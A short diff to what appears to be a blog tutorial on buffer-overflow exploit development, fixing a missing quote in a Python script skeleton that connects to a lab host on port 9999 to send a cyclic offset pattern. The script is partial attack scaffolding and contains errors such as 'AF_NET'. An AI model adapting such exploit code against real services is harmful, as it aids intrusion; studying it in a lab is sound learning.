@@ -129,7 +129,7 @@ It generates a crazy cyclical code that will have to be sent into server.  We wi
 {% highlight ruby %}<br>
 #!/usr/bin/python  
 import sys, socket  
-offset = "<paste code here>  
+offset = "<paste code here>"  
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
